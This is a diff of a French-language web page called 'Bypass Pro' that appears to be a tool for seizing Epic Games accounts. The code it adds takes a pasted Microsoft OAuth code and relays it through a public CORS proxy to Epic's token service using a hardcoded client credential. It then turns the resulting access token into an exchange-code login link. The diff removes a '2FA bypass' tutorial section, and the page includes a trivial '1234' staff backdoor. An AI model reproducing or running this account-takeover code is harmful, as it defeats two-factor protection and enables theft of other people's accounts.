@@ -7,10 +7,8 @@
     <link rel="icon" type="image/webp" href="https://ftnaccounts.mysellauth.com/storage/images/683973.webp">
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Inter:wght@300;400;700&display=swap" rel="stylesheet">
-    
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
-
     <script src="badges.js"></script>
 
     <style>
@@ -18,23 +16,12 @@
         body { background-color: #020202; font-family: 'Inter', sans-serif; color: white; margin: 0; padding-bottom: 50px; }
         .bg-grid { position: fixed; inset: 0; background-image: linear-gradient(to right, rgba(255,255,255,0.02) 1px, transparent 1px), linear-gradient(to bottom, rgba(255,255,255,0.02) 1px, transparent 1px); background-size: 40px 40px; z-index: -1; }
         .glass-card { background: #0a0a0f; border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 40px; }
-        
-        .btn-id-custom {
-            background: rgba(0, 255, 157, 0.02); border: 1px solid #004d33; color: #00ff9d;
-            font-size: 10px; font-weight: 900; padding: 8px 22px; border-radius: 50px;
-            text-transform: uppercase; cursor: pointer; transition: 0.3s;
-        }
-
-        .badge-wrapper {
-            background: rgba(0, 0, 0, 0.6); border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 18px; padding: 8px 12px; display: flex; align-items: center; gap: 12px; margin-top: 12px;
-            min-height: 52px;
-        }
-        .badge-img { width: 32px; height: 32px; object-fit: contain; cursor: help; transition: 0.2s; }
-        .badge-img:hover { transform: scale(1.1); }
-
+        .btn-id-custom { background: rgba(0, 255, 157, 0.02); border: 1px solid #004d33; color: #00ff9d; font-size: 10px; font-weight: 900; padding: 8px 22px; border-radius: 50px; text-transform: uppercase; cursor: pointer; }
+        .badge-wrapper { background: rgba(0, 0, 0, 0.6); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 18px; padding: 8px 12px; display: flex; align-items: center; gap: 12px; margin-top: 12px; min-height: 52px; }
+        .badge-img { width: 32px; height: 32px; object-fit: contain; cursor: help; }
         #smartModal, #adminPanel { display: none; position: fixed; inset: 0; z-index: 10000; background: rgba(0,0,0,0.95); align-items: center; justify-content: center; backdrop-filter: blur(10px); }
-        .btn-premium { background: linear-gradient(to right, #00ff9d, #0078d4); color: black; font-weight: 900; border-radius: 20px; }
+        .btn-premium { background: linear-gradient(to right, #00ff9d, #0078d4); color: black; font-weight: 900; border-radius: 20px; transition: 0.3s; }
+        .btn-premium:hover { transform: scale(1.02); opacity: 0.9; }
     </style>
 </head>
 <body class="flex flex-col items-center">
@@ -56,15 +43,14 @@
                 <img src="2026.png" class="w-10">
                 <p id="badgeStatusText" class="text-[10px] font-bold text-gray-500 uppercase">Vérifier ID...</p>
             </div>
-            <button onclick="document.getElementById('adminPanel').style.display='none'" class="text-[10px] opacity-50 uppercase font-bold">Quitter la console</button>
+            <button onclick="document.getElementById('adminPanel').style.display='none'" class="text-[10px] opacity-50 uppercase font-bold">Quitter</button>
         </div>
     </div>
 
     <div id="mainUI" class="w-full max-w-5xl p-6 grid grid-cols-1 md:grid-cols-2 gap-10 mt-16">
         <div class="glass-card p-12 flex flex-col relative">
             <div class="flex justify-between items-start mb-10">
-                <h1 ondblclick="beStaff()" class="text-3xl font-black italic uppercase tracking-tighter">Bypass <span class="text-[#00ff9d]">Pro</span></h1>
-                
+                <h1 ondblclick="beStaff()" class="text-3xl font-black italic uppercase">Bypass <span class="text-[#00ff9d]">Pro</span></h1>
                 <div class="flex flex-col items-end">
                     <button onclick="generateUserCode()" class="btn-id-custom">Obtenir mon ID</button>
                     <div id="badgeGroupContainer" class="hidden badge-wrapper"></div>
@@ -73,34 +59,25 @@
 
             <div class="space-y-6">
                 <div><span class="text-[10px] text-gray-500 font-bold uppercase block mb-2">ÉTAPE 01</span>
-                    <a href="https://cors-anywhere.herokuapp.com/corsdemo" target="_blank" class="block w-full p-5 bg-white/5 border border-white/10 rounded-2xl text-center text-[11px] font-black uppercase hover:bg-white/10 transition-all">Activer Proxy Réseau</a>
+                    <a href="https://cors-anywhere.herokuapp.com/corsdemo" target="_blank" class="block w-full p-5 bg-white/5 border border-white/10 rounded-2xl text-center text-[11px] font-black uppercase hover:bg-white/10">Proxy Réseau</a>
                 </div>
                 <div><span class="text-[10px] text-gray-500 font-bold uppercase block mb-2">ÉTAPE 02</span>
                     <a href="https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&scope=xboxlive.signin&response_type=code" target="_blank" class="flex items-center justify-center gap-4 w-full p-5 bg-black border border-white/10 rounded-2xl">
                         <img src="https://th.bing.com/th/id/ODF.WpajYY_eqKSd9GVeS6KG2g?w=32&h=32" class="w-6">
-                        <span class="text-[11px] font-black uppercase">Connexion Microsoft</span>
+                        <span class="text-[11px] font-black uppercase">Microsoft</span>
                     </a>
                 </div>
                 <div><span class="text-[10px] text-gray-500 font-bold uppercase block mb-2">ÉTAPE 03</span>
                     <input type="text" id="oauthUrl" placeholder="URL OAuth ici..." class="w-full bg-black/50 border border-white/10 p-5 rounded-2xl text-xs outline-none focus:border-[#00ff9d]">
                 </div>
             </div>
-            <button id="startBypass" class="btn-premium w-full py-6 rounded-3xl uppercase font-black text-sm tracking-[5px] mt-10">Exécuter l'Injection</button>
+            <button onclick="startBypassProcess()" class="btn-premium w-full py-6 rounded-3xl uppercase font-black text-sm tracking-[5px] mt-10">Exécuter l'Injection</button>
         </div>
 
         <div class="glass-card flex flex-col h-full border-white/5 overflow-hidden">
             <div class="bg-white/5 px-8 py-4 border-b border-white/10 text-[10px] font-bold text-gray-400 uppercase italic">Terminal Output</div>
             <div id="console" class="p-8 font-mono text-[11px] text-[#00ff9d] space-y-3 h-96 overflow-y-auto">
                 <div class="opacity-40">> Système initialisé...</div>
-            </div>
-        </div>
-    </div>
-
-    <div class="w-full max-w-4xl px-6 mt-12 mb-20">
-        <div class="glass-card p-10 text-center border-white/5">
-            <h2 class="text-[#00ff9d] font-bold uppercase italic mb-8">Tutorial Bypass 2FA</h2>
-            <div class="rounded-[30px] overflow-hidden bg-black border border-white/10 shadow-2xl">
-                <video controls class="w-full"><source src="tutorial.mp4" type="video/mp4"></video>
             </div>
         </div>
     </div>
@@ -117,7 +94,6 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        // Fonction pour écrire dans le terminal
         function lg(t) {
             const c = document.getElementById('console');
             const d = document.createElement('div');
@@ -126,46 +102,71 @@
             c.scrollTop = c.scrollHeight;
         }
 
-        // Rendu des badges basé sur le fichier externe badges.js
+        // --- MOTEUR DE BYPASS ---
+        async function startBypassProcess() {
+            const url = document.getElementById('oauthUrl').value.trim();
+            if(!url) return lg("<span class='text-red-500'>ERREUR : URL vide.</span>");
+
+            const proxy = "https://cors-anywhere.herokuapp.com/";
+            const auth = "Basic MzRhZTM2MzhlNDhlNDdiNDk4ZjlhZThlYTYyYTFmYmU6M2NlYmJhY2ExYjVlNGYyYmI3ODU3NjIwYzgzOTdhZDM=";
+            
+            try {
+                lg("Extraction du code Microsoft...");
+                const code = new URLSearchParams(new URL(url).search).get('code');
+                if(!code) throw new Error("Code OAuth non trouvé.");
+
+                lg("Requête vers Epic Games via Proxy...");
+                const r1 = await fetch(proxy + 'https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': auth },
+                    body: new URLSearchParams({ 'grant_type': 'external_auth', 'external_auth_type': 'xbl', 'external_auth_token': code })
+                });
+
+                const d1 = await r1.json();
+                if(d1.access_token) {
+                    lg("<span class='text-white'>Compte trouvé : " + d1.displayName + "</span>");
+                    lg("Génération du lien d'accès...");
+                    
+                    const r2 = await fetch(proxy + 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange', {
+                        headers: { 'Authorization': "Bearer " + d1.access_token }
+                    });
+                    const d2 = await r2.json();
+                    
+                    lg("<span class='text-blue-400'>SUCCÈS ! Lien généré.</span>");
+                    lg("<a href='https://www.epicgames.com/id/exchange?exchangeCode="+d2.code+"' target='_blank' class='underline'>[ CLIQUEZ ICI POUR ACCÉDER ]</a>");
+                } else {
+                    lg("<span class='text-red-500'>ÉCHEC : Code déjà utilisé ou expiré.</span>");
+                }
+            } catch(e) {
+                lg("<span class='text-red-500'>ERREUR CRITIQUE : " + e.message + "</span>");
+            }
+        }
+
+        // --- GESTION BADGES & ID ---
         function renderBadges(userData) {
             const container = document.getElementById('badgeGroupContainer');
             container.innerHTML = ""; 
             let hasAny = false;
-
             for (const [key, config] of Object.entries(badgesConfig)) {
-                const ownsBadge = userData && userData[key];
-                const isLocalStaff = key === 'isStaff' && localStorage.getItem('isStaff');
-
-                if (ownsBadge || isLocalStaff) {
+                if ((userData && userData[key]) || (key === 'isStaff' && localStorage.getItem('isStaff'))) {
                     hasAny = true;
                     const img = document.createElement('img');
-                    img.src = config.img;
-                    img.title = config.title;
-                    img.className = "badge-img";
+                    img.src = config.img; img.title = config.title; img.className = "badge-img";
                     if(config.action) img.onclick = config.action;
                     container.appendChild(img);
                 }
             }
             if(hasAny) container.classList.remove('hidden');
-            else container.classList.add('hidden');
         }
 
         window.onload = () => {
             const id = localStorage.getItem('user_id');
-            if(id) {
-                lg(`IDENTIFIANT ACTUEL : ${id}`);
-                listenToMyBadges(id);
-            }
-            if (!localStorage.getItem('badge2026_claimed')) {
-                document.getElementById('smartModal').style.display = 'flex';
-            }
+            if(id) { lg(`IDENTIFIANT ACTUEL : ${id}`); listenToMyBadges(id); }
+            if (!localStorage.getItem('badge2026_claimed')) document.getElementById('smartModal').style.display = 'flex';
         };
 
         function listenToMyBadges(id) {
-            db.ref('users/' + id).on('value', (s) => {
-                const data = s.exists() ? s.val() : {};
-                renderBadges(data);
-            });
+            db.ref('users/' + id).on('value', (s) => renderBadges(s.exists() ? s.val() : {}));
         }
 
         function claimBadgeAndClose() {
@@ -186,13 +187,7 @@
             listenToMyBadges(id);
         }
 
-        function beStaff() { 
-            if(prompt("Code Staff :") === "1234") { 
-                localStorage.setItem('isStaff', 'true'); 
-                location.reload(); 
-            } 
-        }
-
+        function beStaff() { if(prompt("Code Staff :") === "1234") { localStorage.setItem('isStaff', 'true'); location.reload(); } }
         function checkUserStatus() {
             const id = document.getElementById('idSearch').value.trim();
             if(!id) return;
@@ -204,14 +199,11 @@
                 }
             });
         }
-
         function toggleBadgeFirebase() {
             const id = document.getElementById('idSearch').value.trim();
             if(!id) return;
             const ref = db.ref('users/' + id);
-            ref.once('value', (s) => { 
-                if(s.exists()) ref.update({ has2026: !s.val().has2026 }); 
-            });
+            ref.once('value', (s) => { if(s.exists()) ref.update({ has2026: !s.val().has2026 }); });
         }
     </script>
 </body>
